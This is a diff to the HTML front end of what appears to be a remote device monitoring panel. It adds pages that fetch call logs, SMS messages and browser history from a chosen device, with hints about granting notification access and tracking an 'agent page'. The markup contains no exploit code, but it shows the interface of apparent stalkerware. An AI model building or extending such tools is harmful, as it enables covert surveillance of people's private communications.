@@ -50,6 +50,22 @@
         </div>
 
         <div class="nav-section">
+          <div class="nav-section-title">Monitoring</div>
+          <a class="nav-item" data-page="calllog" onclick="navigateTo('calllog')">
+            <span class="icon">📞</span>
+            <span>Call Log</span>
+          </a>
+          <a class="nav-item" data-page="sms" onclick="navigateTo('sms')">
+            <span class="icon">💬</span>
+            <span>SMS Messages</span>
+          </a>
+          <a class="nav-item" data-page="history" onclick="navigateTo('history')">
+            <span class="icon">🕐</span>
+            <span>History</span>
+          </a>
+        </div>
+
+        <div class="nav-section">
           <div class="nav-section-title">Tools</div>
           <a class="nav-item" data-page="info" onclick="navigateTo('info')">
             <span class="icon">ℹ️</span>
@@ -281,6 +297,96 @@
             <div class="icon">📁</div>
             <h3>No Files</h3>
             <p>Select a device to browse its files</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CALL LOG ============ -->
+      <section class="page-section" id="page-calllog">
+        <div class="page-header">
+          <div>
+            <h2>Call Log</h2>
+            <p class="subtitle">View call history from your device / Call history dekhein</p>
+          </div>
+          <select class="select-device" id="calllogDeviceSelect" onchange="onCalllogDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchCallLog()">
+            <span>📞</span> Fetch Call Log
+          </button>
+          <span id="calllogCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="call-log-list" id="callLogList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">📞</div>
+            <h3>No Call Log</h3>
+            <p>Select a device and fetch call log</p>
+            <p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ SMS MESSAGES ============ -->
+      <section class="page-section" id="page-sms">
+        <div class="page-header">
+          <div>
+            <h2>SMS Messages</h2>
+            <p class="subtitle">View SMS messages from your device / SMS padhein</p>
+          </div>
+          <select class="select-device" id="smsDeviceSelect" onchange="onSmsDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchSms()">
+            <span>💬</span> Fetch SMS
+          </button>
+          <span id="smsCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="sms-list" id="smsList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">💬</div>
+            <h3>No SMS Messages</h3>
+            <p>Select a device and fetch SMS messages</p>
+            <p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ HISTORY ============ -->
+      <section class="page-section" id="page-history">
+        <div class="page-header">
+          <div>
+            <h2>Browser History</h2>
+            <p class="subtitle">View browsing activity from your device / Browsing history dekhein</p>
+          </div>
+          <select class="select-device" id="historyDeviceSelect" onchange="onHistoryDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchHistory()">
+            <span>🕐</span> Fetch History
+          </button>
+          <button class="btn btn-outline" onclick="clearHistoryList()">
+            <span>🗑️</span> Clear
+          </button>
+          <span id="historyCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="history-list" id="historyList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">🕐</div>
+            <h3>No History</h3>
+            <p>Select a device and fetch browsing history</p>
+            <p style="font-size:13px;color:var(--text-muted);margin-top:8px">Agent page open hone ke baad ki activity track hogi</p>
           </div>
         </div>
       </section>
